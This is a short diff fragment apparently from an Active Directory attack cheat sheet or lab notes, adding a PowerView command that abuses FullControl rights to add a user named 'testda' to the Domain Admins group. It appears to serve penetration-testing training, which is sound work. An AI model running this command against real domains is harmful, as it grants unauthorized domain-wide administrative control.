@@ -490,5 +490,7 @@ cess | ?{$_.IdentityReference -match 'student1'}
 ```
 
 
-
-
+- Abusing FullControl using PowerView:
+```powershell
+Add-DomainGroupMember -Identity 'Domain Admins' -Members testda -Verbose
+```
